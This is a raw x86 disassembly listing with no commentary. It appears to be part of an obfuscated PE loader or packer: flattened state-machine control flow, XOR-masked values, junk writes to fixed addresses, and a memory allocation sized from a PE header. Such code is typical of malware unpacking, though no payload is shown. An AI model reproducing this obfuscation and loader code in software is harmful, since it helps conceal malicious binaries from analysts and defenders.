  4270b2:	mov    eax,DWORD PTR [ebp+0x8]
  4270b5:	xor    eax,edi
  4270b7:	add    eax,ebx
  4270b9:	mov    DWORD PTR [ebp+0x18],eax
  4270bc:	mov    eax,DWORD PTR [ebp+0x10]
  4270bf:	mov    eax,DWORD PTR [eax+0x50]
  4270c2:	sub    eax,0xc
  4270c5:	mov    DWORD PTR [ebp-0x28],eax
  4270c8:	mov    eax,DWORD PTR [ebp+0x10]
  4270cb:	mov    eax,DWORD PTR [eax+0x38]
  4270ce:	mov    ecx,DWORD PTR [ebp+0x10]
  4270d1:	dec    eax
  4270d2:	test   DWORD PTR [ecx+0x54],eax
  4270d5:	mov    eax,DWORD PTR [ebp+0x10]
  4270d8:	je     0x4270f2
  4270da:	mov    eax,DWORD PTR [eax+0x38]
  4270dd:	mov    ecx,DWORD PTR [ebp+0x10]
  4270e0:	mov    ecx,DWORD PTR [ecx+0x54]
  4270e3:	dec    eax
  4270e4:	not    eax
  4270e6:	and    ecx,eax
  4270e8:	mov    eax,DWORD PTR [ebp+0x10]
  4270eb:	mov    eax,DWORD PTR [eax+0x38]
  4270ee:	add    eax,ecx
  4270f0:	jmp    0x4270f5
  4270f2:	mov    eax,DWORD PTR [eax+0x54]
  4270f5:	mov    DWORD PTR [ebp+0x1c],eax
  4270f8:	mov    eax,DWORD PTR [ebp+0x8]
  4270fb:	xor    eax,edi
  4270fd:	add    eax,ebx
  4270ff:	mov    DWORD PTR [ebp+0x18],eax
  427102:	mov    eax,DWORD PTR [ebp+0x8]
  427105:	xor    eax,edi
  427107:	add    eax,ebx
  427109:	mov    DWORD PTR [ebp+0x18],eax
  42710c:	mov    eax,DWORD PTR [ebp+0x8]
  42710f:	mov    ecx,DWORD PTR [ebp-0x24]
  427112:	xor    eax,edi
  427114:	add    eax,ebx
  427116:	mov    DWORD PTR [ecx],eax
  427118:	mov    DWORD PTR [ebp+0x18],edx
  42711b:	mov    DWORD PTR [ebp+0x18],0xf89c85b2
  427122:	mov    DWORD PTR [ebp+0x18],0xf89c85b3
  427129:	mov    DWORD PTR [ebp+0x18],0xf89c85bc
  427130:	mov    eax,DWORD PTR [ebp-0x8]
  427133:	mov    ecx,DWORD PTR [ebp+0x1c]
  427136:	xor    eax,edi
  427138:	add    eax,ebx
  42713a:	imul   eax,ecx
  42713d:	mov    ecx,DWORD PTR [ebp+0x8]
  427140:	mov    edx,DWORD PTR [ebp-0x28]
  427143:	xor    ecx,edi
  427145:	lea    ecx,[ecx+edx*1+0x3272ec]
  42714c:	cmp    eax,ecx
  42714e:	jae    0x4274ff
  427154:	mov    eax,DWORD PTR [ebp+0x8]
  427157:	xor    eax,edi
  427159:	add    eax,ebx
  42715b:	mov    DWORD PTR [ebp+0x18],eax
  42715e:	mov    eax,DWORD PTR [ebp+0x1c]
  427161:	add    eax,DWORD PTR [ebp-0x1c]
  427164:	mov    DWORD PTR [ebp-0x4],eax
  427167:	push   DWORD PTR [ebp-0x4]
  42716a:	mov    esi,DWORD PTR [ebp-0x1c]
  42716d:	mov    ecx,DWORD PTR [ebp+0x10]
  427170:	call   0x4262bf
  427175:	mov    DWORD PTR [ebp+0xc],eax
  427178:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  42717f:	mov    eax,DWORD PTR [ebp-0x18]
  427182:	xor    eax,edi
  427184:	lea    ecx,[ebp-0x40]
  427187:	add    eax,ebx
  427189:	push   ecx
  42718a:	call   0x426853
  42718f:	mov    eax,DWORD PTR [ebp+0xc]
  427192:	test   eax,eax
  427194:	je     0x4271e4
  427196:	mov    eax,DWORD PTR [ebp-0x18]
  427199:	xor    eax,edi
  42719b:	add    eax,ebx
  42719d:	push   eax
  42719e:	push   DWORD PTR [ebp+0xc]
  4271a1:	lea    eax,[ebp-0x40]
  4271a4:	push   eax
  4271a5:	call   0x426749
  4271aa:	mov    eax,DWORD PTR [ebp-0x4]
  4271ad:	mov    DWORD PTR [ebp-0x18],eax
  4271b0:	mov    eax,DWORD PTR [ebp-0x18]
  4271b3:	mov    ecx,DWORD PTR [ebp-0x1c]
  4271b6:	sub    eax,ecx
  4271b8:	mov    DWORD PTR [ebp-0x18],eax
  4271bb:	mov    eax,DWORD PTR [ebp+0xc]
  4271be:	mov    ecx,DWORD PTR [ebp+0xc]
  4271c1:	mov    eax,DWORD PTR [eax+0x10]
  4271c4:	add    eax,DWORD PTR [ecx+0xc]
  4271c7:	mov    ecx,DWORD PTR [ebp-0x18]
  4271ca:	cmp    ecx,eax
  4271cc:	jb     0x4271e4
  4271ce:	mov    eax,DWORD PTR [ebp+0xc]
  4271d1:	mov    eax,DWORD PTR [eax+0xc]
  4271d4:	mov    ecx,DWORD PTR [ebp+0xc]
  4271d7:	add    eax,DWORD PTR [ecx+0x8]
  4271da:	mov    ecx,DWORD PTR [ebp-0x18]
  4271dd:	sub    eax,ecx
  4271df:	jmp    0x4274d2
  4271e4:	push   0xc
  4271e6:	push   DWORD PTR [ebp-0x4]
  4271e9:	lea    eax,[ebp-0x4c]
  4271ec:	push   eax
  4271ed:	call   0x426749
  4271f2:	mov    eax,0xf89c85b0
  4271f7:	mov    DWORD PTR [ebp-0x2c],eax
  4271fa:	mov    DWORD PTR [ebp-0x30],0xf89c85b1
  427201:	mov    DWORD PTR [ebp-0x34],0xf89c85b2
  427208:	mov    DWORD PTR [ebp-0x38],0xf89c85b3
  42720f:	lea    ecx,[ebp-0x2c]
  427212:	mov    DWORD PTR [ebp-0xc],ecx
  427215:	lea    ecx,[ebp-0x30]
  427218:	mov    DWORD PTR [ebp-0x10],ecx
  42721b:	lea    ecx,[ebp-0x34]
  42721e:	mov    DWORD PTR [ebp+0xc],ecx
  427221:	lea    ecx,[ebp-0x38]
  427224:	mov    DWORD PTR [ebp-0x14],ecx
  427227:	mov    ecx,DWORD PTR [ebp+0x8]
  42722a:	xor    ecx,edi
  42722c:	add    ecx,ebx
  42722e:	mov    DWORD PTR [ebp-0x18],ecx
  427231:	jmp    0x42742d
  427236:	cmp    eax,0xf89c85b2
  42723b:	je     0x42743f
  427241:	mov    ecx,DWORD PTR [ebp-0x8]
  427244:	xor    ecx,edi
  427246:	mov    esi,eax
  427248:	add    ecx,ebx
  42724a:	mov    DWORD PTR [ebp+0x18],ecx
  42724d:	mov    eax,DWORD PTR [ebp-0x18]
  427250:	xor    esi,edi
  427252:	lea    eax,[eax+esi*1+0x3272ec]
  427259:	mov    DWORD PTR [ebp-0x18],eax
  42725c:	mov    eax,DWORD PTR [ebp-0x8]
  42725f:	mov    ecx,DWORD PTR [ebp-0x18]
  427262:	xor    eax,edi
  427264:	add    eax,ebx
  427266:	cmp    ecx,eax
  427268:	jne    0x42727d
  42726a:	mov    eax,DWORD PTR [ebp+0x8]
  42726d:	xor    eax,edi
  42726f:	add    eax,ebx
  427271:	push   eax
  427272:	push   0xc
  427274:	lea    eax,[ebp-0x4c]
  427277:	push   eax
  427278:	call   0x426d2f
  42727d:	mov    eax,DWORD PTR [ebp-0xc]
  427280:	mov    eax,DWORD PTR [eax]
  427282:	xor    eax,edi
  427284:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  42728b:	mov    ecx,DWORD PTR [ebp+0x8]
  42728e:	xor    ecx,edi
  427290:	movzx  eax,al
  427293:	add    ecx,ebx
  427295:	cmp    eax,ecx
  427297:	je     0x427415
  42729d:	mov    eax,DWORD PTR [ebp-0x10]
  4272a0:	mov    eax,DWORD PTR [eax]
  4272a2:	xor    eax,edi
  4272a4:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  4272ab:	mov    ecx,DWORD PTR [ebp+0x8]
  4272ae:	xor    ecx,edi
  4272b0:	movzx  eax,al
  4272b3:	add    ecx,ebx
  4272b5:	cmp    eax,ecx
  4272b7:	je     0x427415
  4272bd:	mov    eax,DWORD PTR [ebp+0xc]
  4272c0:	mov    eax,DWORD PTR [eax]
  4272c2:	xor    eax,edi
  4272c4:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  4272cb:	mov    ecx,DWORD PTR [ebp+0x8]
  4272ce:	xor    ecx,edi
  4272d0:	movzx  eax,al
  4272d3:	add    ecx,ebx
  4272d5:	cmp    eax,ecx
  4272d7:	je     0x427415
  4272dd:	mov    eax,DWORD PTR [ebp-0x14]
  4272e0:	mov    eax,DWORD PTR [eax]
  4272e2:	xor    eax,edi
  4272e4:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  4272eb:	mov    ecx,DWORD PTR [ebp+0x8]
  4272ee:	xor    ecx,edi
  4272f0:	movzx  eax,al
  4272f3:	add    ecx,ebx
  4272f5:	cmp    eax,ecx
  4272f7:	je     0x427415
  4272fd:	mov    eax,DWORD PTR [ebp-0x10]
  427300:	mov    eax,DWORD PTR [eax]
  427302:	xor    eax,edi
  427304:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  42730b:	mov    ecx,DWORD PTR [ebp-0xc]
  42730e:	mov    ecx,DWORD PTR [ecx]
  427310:	xor    ecx,edi
  427312:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  427319:	xor    al,cl
  42731b:	mov    ecx,DWORD PTR [ebp+0xc]
  42731e:	mov    ecx,DWORD PTR [ecx]
  427320:	xor    ecx,edi
  427322:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  427329:	or     al,cl
  42732b:	mov    ecx,DWORD PTR [ebp-0xc]
  42732e:	mov    ecx,DWORD PTR [ecx]
  427330:	xor    ecx,edi
  427332:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a4]
  427339:	cmp    cl,al
  42733b:	jne    0x427415
  427341:	mov    eax,DWORD PTR [ebp+0xc]
  427344:	mov    eax,DWORD PTR [eax]
  427346:	xor    eax,edi
  427348:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  42734f:	mov    ecx,DWORD PTR [ebp-0x10]
  427352:	mov    ecx,DWORD PTR [ecx]
  427354:	xor    ecx,edi
  427356:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  42735d:	xor    al,cl
  42735f:	mov    ecx,DWORD PTR [ebp-0x14]
  427362:	mov    ecx,DWORD PTR [ecx]
  427364:	xor    ecx,edi
  427366:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  42736d:	or     al,cl
  42736f:	mov    ecx,DWORD PTR [ebp-0x10]
  427372:	mov    ecx,DWORD PTR [ecx]
  427374:	xor    ecx,edi
  427376:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a4]
  42737d:	cmp    cl,al
  42737f:	jne    0x427415
  427385:	mov    eax,DWORD PTR [ebp-0x14]
  427388:	mov    eax,DWORD PTR [eax]
  42738a:	xor    eax,edi
  42738c:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  427393:	mov    ecx,DWORD PTR [ebp+0xc]
  427396:	mov    ecx,DWORD PTR [ecx]
  427398:	xor    ecx,edi
  42739a:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  4273a1:	xor    al,cl
  4273a3:	mov    ecx,DWORD PTR [ebp-0xc]
  4273a6:	mov    ecx,DWORD PTR [ecx]
  4273a8:	xor    ecx,edi
  4273aa:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  4273b1:	or     al,cl
  4273b3:	mov    ecx,DWORD PTR [ebp+0xc]
  4273b6:	mov    ecx,DWORD PTR [ecx]
  4273b8:	xor    ecx,edi
  4273ba:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a4]
  4273c1:	cmp    cl,al
  4273c3:	jne    0x427415
  4273c5:	mov    eax,DWORD PTR [ebp-0x14]
  4273c8:	mov    eax,DWORD PTR [eax]
  4273ca:	xor    eax,edi
  4273cc:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  4273d3:	mov    ecx,DWORD PTR [ebp-0xc]
  4273d6:	mov    ecx,DWORD PTR [ecx]
  4273d8:	xor    ecx,edi
  4273da:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  4273e1:	xor    al,cl
  4273e3:	mov    ecx,DWORD PTR [ebp-0x10]
  4273e6:	mov    ecx,DWORD PTR [ecx]
  4273e8:	xor    ecx,edi
  4273ea:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  4273f1:	or     al,cl
  4273f3:	mov    ecx,DWORD PTR [ebp-0x14]
  4273f6:	mov    ecx,DWORD PTR [ecx]
  4273f8:	xor    ecx,edi
  4273fa:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a4]
  427401:	cmp    cl,al
  427403:	jne    0x427415
  427405:	lea    eax,[ebp-0x4c]
  427408:	push   eax
  427409:	call   0x426ed0
  42740e:	mov    ecx,DWORD PTR [ebp-0x44]
  427411:	cmp    eax,ecx
  427413:	je     0x42741f
  427415:	mov    eax,DWORD PTR [ebp+0x8]
  427418:	xor    eax,edi
  42741a:	add    eax,ebx
  42741c:	mov    DWORD PTR [ebp+0x18],eax
  42741f:	mov    eax,DWORD PTR [ebp-0x8]
  427422:	xor    eax,edi
  427424:	lea    eax,[eax+esi*1+0x3272ec]
  42742b:	xor    eax,edi
  42742d:	mov    ecx,DWORD PTR [ebp+0x8]
  427430:	mov    edx,DWORD PTR [ebp+0x18]
  427433:	xor    ecx,edi
  427435:	add    ecx,ebx
  427437:	cmp    edx,ecx
  427439:	je     0x427236
  42743f:	mov    eax,DWORD PTR [ebp+0x8]
  427442:	mov    ecx,DWORD PTR [ebp+0x18]
  427445:	xor    eax,edi
  427447:	add    eax,ebx
  427449:	cmp    ecx,eax
  42744b:	jne    0x42745e
  42744d:	mov    eax,DWORD PTR [ebp-0x8]
  427450:	mov    ecx,DWORD PTR [ebp+0x1c]
  427453:	xor    eax,edi
  427455:	lea    eax,[eax+ecx*1+0x3272ec]
  42745c:	jmp    0x4274d5
  42745e:	push   0x18
  427460:	push   DWORD PTR [ebp-0x4]
  427463:	lea    eax,[ebp-0x64]
  427466:	push   eax
  427467:	call   0x426749
  42746c:	mov    eax,DWORD PTR [ebp+0x8]
  42746f:	mov    ecx,DWORD PTR [ebp-0x18]
  427472:	xor    eax,edi
  427474:	add    eax,ebx
  427476:	cmp    eax,ecx
  427478:	je     0x42748d
  42747a:	mov    eax,DWORD PTR [ebp+0x8]
  42747d:	xor    eax,edi
  42747f:	add    eax,ebx
  427481:	push   eax
  427482:	push   0x18
  427484:	lea    eax,[ebp-0x64]
  427487:	push   eax
  427488:	call   0x426d2f
  42748d:	mov    eax,DWORD PTR [ebp-0x4]
  427490:	add    eax,0x18
  427493:	mov    DWORD PTR [ebp+0x18],eax
  427496:	push   DWORD PTR [ebp-0x50]
  427499:	push   DWORD PTR [ebp+0x18]
  42749c:	mov    eax,DWORD PTR [ebp-0x54]
  42749f:	add    eax,DWORD PTR [ebp-0x20]
  4274a2:	push   eax
  4274a3:	call   0x426749
  4274a8:	mov    eax,DWORD PTR [ebp+0x8]
  4274ab:	mov    ecx,DWORD PTR [ebp-0x18]
  4274ae:	xor    eax,edi
  4274b0:	add    eax,ebx
  4274b2:	cmp    eax,ecx
  4274b4:	je     0x4274c7
  4274b6:	push   0x0
  4274b8:	push   DWORD PTR [ebp-0x50]
  4274bb:	mov    eax,DWORD PTR [ebp-0x54]
  4274be:	add    eax,DWORD PTR [ebp-0x20]
  4274c1:	push   eax
  4274c2:	call   0x426d2f
  4274c7:	mov    eax,DWORD PTR [ebp-0x24]
  4274ca:	mov    ecx,DWORD PTR [ebp-0x50]
  4274cd:	add    DWORD PTR [eax],ecx
  4274cf:	mov    eax,DWORD PTR [ebp-0x50]
  4274d2:	add    eax,DWORD PTR [ebp+0x1c]
  4274d5:	mov    DWORD PTR [ebp+0x1c],eax
  4274d8:	mov    eax,DWORD PTR [ebp-0x8]
  4274db:	mov    ecx,DWORD PTR [ebp+0x1c]
  4274de:	xor    eax,edi
  4274e0:	add    eax,ebx
  4274e2:	imul   eax,ecx
  4274e5:	mov    ecx,DWORD PTR [ebp+0x8]
  4274e8:	mov    edx,DWORD PTR [ebp-0x28]
  4274eb:	xor    ecx,edi
  4274ed:	lea    ecx,[ecx+edx*1+0x3272ec]
  4274f4:	cmp    eax,ecx
  4274f6:	jb     0x427154
  4274fc:	mov    esi,DWORD PTR [ebp+0x14]
  4274ff:	mov    eax,DWORD PTR [ebp-0x20]
  427502:	mov    DWORD PTR [esi],eax
  427504:	jmp    0x42754b
  427506:	mov    ecx,DWORD PTR [ebp+0x8]
  427509:	mov    edx,DWORD PTR [ebp+0xc]
  42750c:	xor    ecx,edi
  42750e:	xor    edx,edi
  427510:	add    ecx,ebx
  427512:	add    edx,ebx
  427514:	cmp    ecx,edx
  427516:	jne    0x42752a
  427518:	mov    eax,ds:0x7f642ddf
  42751d:	imul   eax,eax,0x9f15fcce
  427523:	mov    ds:0x7f642ddf,eax
  427528:	jmp    0x42754b
  42752a:	mov    ecx,DWORD PTR [ebp+0x8]
  42752d:	xor    ecx,edi
  42752f:	add    ecx,ebx
  427531:	cmp    eax,ecx
  427533:	je     0x427541
  427535:	sub    DWORD PTR ds:0xf861e3f,0x709beac1
  42753f:	jmp    0x42754b
  427541:	and    DWORD PTR ds:0x3343fadf,0x5265ec3e
  42754b:	pop    edi
  42754c:	pop    esi
  42754d:	pop    ebx
  42754e:	leave  
  42754f:	ret    0x18
  427552:	push   ebp
  427553:	mov    ebp,esp
  427555:	and    esp,0xfffffff8
  427558:	mov    eax,DWORD PTR [ebp+0x20]
  42755b:	sub    esp,0x14
  42755e:	push   ebx
  42755f:	mov    ebx,DWORD PTR [ebp+0x14]
  427562:	push   esi
  427563:	push   edi
  427564:	cmp    eax,0xf89c85b0
  427569:	jne    0x427575
  42756b:	push   0xf89c85b1
  427570:	jmp    0x4276a7
  427575:	mov    eax,DWORD PTR [ebp+0x20]
  427578:	cmp    eax,0xf89c85b1
  42757d:	jne    0x427589
  42757f:	push   0xf89c85b2
  427584:	jmp    0x4276a7
  427589:	mov    eax,DWORD PTR [ebp+0x20]
  42758c:	cmp    eax,0xf89c85b2
  427591:	jne    0x42759d
  427593:	push   0xf89c85b3
  427598:	jmp    0x4276a7
  42759d:	mov    eax,DWORD PTR [ebp+0x20]
  4275a0:	cmp    eax,0xf89c85b3
  4275a5:	jne    0x4275b1
  4275a7:	push   0xf89c85bc
  4275ac:	jmp    0x4276a7
  4275b1:	mov    ecx,DWORD PTR [ebp+0x20]
  4275b4:	mov    eax,0xf89c85bf
  4275b9:	cmp    ecx,eax
  4275bb:	jne    0x427677
  4275c1:	mov    eax,DWORD PTR [ebp+0x10]
  4275c4:	mov    DWORD PTR [esp+0xc],eax
  4275c8:	mov    eax,DWORD PTR [ebp+0x18]
  4275cb:	mov    DWORD PTR [esp+0x14],eax
  4275cf:	mov    eax,DWORD PTR [ebp+0xc]
  4275d2:	mov    DWORD PTR [esp+0x18],eax
  4275d6:	mov    eax,DWORD PTR [ebp+0x8]
  4275d9:	mov    DWORD PTR [esp+0x10],eax
  4275dd:	mov    eax,DWORD PTR [esp+0x10]
  4275e1:	mov    ecx,DWORD PTR [esp+0x14]
  4275e5:	mov    edi,0x75108a4
  4275ea:	xor    eax,edi
  4275ec:	mov    esi,0x3272ec
  4275f1:	add    eax,esi
  4275f3:	mov    DWORD PTR [ecx],eax
  4275f5:	mov    eax,DWORD PTR [esp+0xc]
  4275f9:	mov    eax,DWORD PTR [eax+0x194]
  4275ff:	mov    ecx,DWORD PTR [eax]
  427601:	mov    eax,DWORD PTR [esp+0xc]
  427605:	mov    eax,DWORD PTR [eax+0x194]
  42760b:	mov    eax,DWORD PTR [eax]
  42760d:	add    eax,DWORD PTR [ecx+0x3c]
  427610:	mov    ecx,DWORD PTR [esp+0xc]
  427614:	mov    ecx,DWORD PTR [ecx+0x1d8]
  42761a:	mov    ecx,DWORD PTR [ecx+0x14]
  42761d:	push   0x4
  42761f:	push   0x3000
  427624:	push   DWORD PTR [eax+0x50]
  427627:	push   0x0
  427629:	call   ecx
  42762b:	mov    DWORD PTR [ebx],eax
  42762d:	mov    eax,DWORD PTR [esp+0x10]
  427631:	push   DWORD PTR [esp+0xc]
  427635:	xor    eax,edi
  427637:	add    eax,esi
  427639:	mov    DWORD PTR [esp+0x20],eax
  42763d:	lea    eax,[esp+0x20]
  427641:	push   eax
  427642:	push   ebx
  427643:	push   DWORD PTR [esp+0x20]
  427647:	push   DWORD PTR [esp+0x28]
  42764b:	push   DWORD PTR [esp+0x24]
  42764f:	call   0x427014
  427654:	mov    eax,DWORD PTR [esp+0x10]
  427658:	mov    ecx,DWORD PTR [ebx]
  42765a:	xor    eax,edi
  42765c:	add    eax,esi
  42765e:	cmp    ecx,eax
  427660:	je     0x4276be
  427662:	mov    eax,DWORD PTR [esp+0x18]
  427666:	mov    ecx,DWORD PTR [esp+0x14]
  42766a:	xor    eax,edi
  42766c:	add    eax,esi
  42766e:	imul   eax,DWORD PTR [esp+0x1c]
  427673:	mov    DWORD PTR [ecx],eax
  427675:	jmp    0x4276be
  427677:	mov    ecx,DWORD PTR [ebp+0x20]
  42767a:	cmp    ecx,0xf89c85bc
  427680:	jne    0x427689
  427682:	push   0xf89c85bd
  427687:	jmp    0x4276a7
  427689:	mov    ecx,DWORD PTR [ebp+0x20]
  42768c:	cmp    ecx,0xf89c85bd
  427692:	jne    0x42769b
  427694:	push   0xf89c85be
  427699:	jmp    0x4276a7
  42769b:	mov    ecx,DWORD PTR [ebp+0x20]
  42769e:	cmp    ecx,0xf89c85be
  4276a4:	jne    0x4276be
  4276a6:	push   eax
  4276a7:	push   DWORD PTR [ebp+0x1c]
  4276aa:	push   DWORD PTR [ebp+0x18]
  4276ad:	push   ebx
  4276ae:	push   DWORD PTR [ebp+0x10]
  4276b1:	push   DWORD PTR [ebp+0xc]
  4276b4:	push   DWORD PTR [ebp+0x8]
  4276b7:	call   0x427552
  4276bc:	mov    DWORD PTR [ebx],eax
  4276be:	mov    eax,DWORD PTR [ebx]
  4276c0:	pop    edi
  4276c1:	pop    esi
  4276c2:	pop    ebx
  4276c3:	mov    esp,ebp
  4276c5:	pop    ebp
  4276c6:	ret    0x1c
  4276c9:	push   ebp
  4276ca:	mov    ebp,esp
  4276cc:	sub    esp,0xc
  4276cf:	mov    eax,0xf89c85b0
  4276d4:	mov    DWORD PTR [ebp-0x8],eax
  4276d7:	mov    DWORD PTR [ebp-0xc],0xf89c85b1
  4276de:	mov    ecx,DWORD PTR [ebp-0x8]
  4276e1:	xor    ecx,0x75108a4
  4276e7:	add    ecx,0x3272ec
  4276ed:	mov    DWORD PTR [ebp-0x4],ecx
  4276f0:	mov    ecx,DWORD PTR [ebp+0xc]
  4276f3:	push   eax
  4276f4:	mov    DWORD PTR [ebp+0xc],ecx
  4276f7:	push   DWORD PTR [ebp+0xc]
  4276fa:	lea    eax,[ebp-0x4]
  4276fd:	push   DWORD PTR [ebp+0x8]
  427700:	push   eax
  427701:	push   DWORD PTR [ebp+0xc]
  427704:	push   DWORD PTR [ebp-0xc]
  427707:	push   DWORD PTR [ebp-0x8]
  42770a:	call   0x427552
  42770f:	mov    DWORD PTR [ebp-0x4],eax
  427712:	mov    eax,DWORD PTR [ebp-0x4]
  427715:	leave  
  427716:	ret    0x8
